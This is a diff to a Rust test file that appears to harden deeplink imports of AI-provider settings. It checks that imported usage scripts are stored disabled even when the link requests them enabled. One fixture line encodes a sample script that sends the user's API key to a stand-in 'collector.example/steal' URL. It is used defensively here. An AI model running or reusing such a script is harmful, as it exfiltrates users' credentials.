@@ -337,7 +337,7 @@ fn test_deeplink_usage_script_does_not_copy_provider_credentials() {
         .and_then(|meta| meta.usage_script.as_ref())
         .expect("usage script should be created");
 
-    assert!(script.enabled);
+    assert!(!script.enabled);
     assert_eq!(script.api_key, None);
     assert_eq!(script.base_url, None);
 }
@@ -439,6 +439,85 @@ fn test_deeplink_usage_script_preserves_distinct_usage_credentials() {
         script.base_url.as_deref(),
         Some("https://usage.example/api")
     );
+}
+
+fn usage_script_request(usage_enabled: Option<bool>) -> DeepLinkImportRequest {
+    DeepLinkImportRequest {
+        version: "v1".to_string(),
+        resource: "provider".to_string(),
+        app: Some("claude".to_string()),
+        name: Some("Test Claude".to_string()),
+        homepage: Some("https://example.com".to_string()),
+        endpoint: Some("https://api.example.com/v1".to_string()),
+        api_key: Some("sk-main".to_string()),
+        icon: None,
+        model: None,
+        notes: None,
+        haiku_model: None,
+        sonnet_model: None,
+        opus_model: None,
+        config: None,
+        config_format: None,
+        config_url: None,
+        apps: None,
+        repo: None,
+        directory: None,
+        branch: None,
+        content: None,
+        description: None,
+        enabled: None,
+        usage_enabled,
+        usage_script: Some(
+            BASE64_STANDARD
+                .encode("({ request: { url: 'https://collector.example/steal?k={{apiKey}}' } })"),
+        ),
+        usage_api_key: None,
+        usage_base_url: None,
+        usage_access_token: None,
+        usage_user_id: None,
+        usage_auto_interval: None,
+    }
+}
+
+#[test]
+fn test_deeplink_usage_script_is_stored_disabled() {
+    use super::provider::build_provider_from_request;
+
+    for usage_enabled in [None, Some(true), Some(false)] {
+        let request = usage_script_request(usage_enabled);
+        let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
+        let script = provider
+            .meta
+            .as_ref()
+            .and_then(|meta| meta.usage_script.as_ref())
+            .expect("usage script should be created");
+
+        assert!(
+            !script.enabled,
+            "usage_enabled={usage_enabled:?} must not enable a deeplink script"
+        );
+        assert!(script.code.contains("collector.example"));
+    }
+}
+
+#[test]
+fn test_parse_deeplink_ignores_usage_enabled_true() {
+    let script_b64 = BASE64_STANDARD.encode("({ request: { url: 'https://x.example' } })");
+    let encoded = url::form_urlencoded::byte_serialize(script_b64.as_bytes()).collect::<String>();
+
+    for query in [
+        format!("&usageScript={encoded}"),
+        format!("&usageScript={encoded}&usageEnabled=true"),
+    ] {
+        let url = format!(
+            "ccswitch://v1/import?resource=provider&app=claude&name=Test&endpoint=https://api.example.com&apiKey=sk-test{query}"
+        );
+        let request = parse_deeplink_url(&url).unwrap();
+        assert_eq!(request.usage_enabled, Some(false), "query: {query}");
+    }
+
+    let url = "ccswitch://v1/import?resource=provider&app=claude&name=Test&endpoint=https://api.example.com&apiKey=sk-test";
+    assert_eq!(parse_deeplink_url(url).unwrap().usage_enabled, None);
 }
 
 #[test]
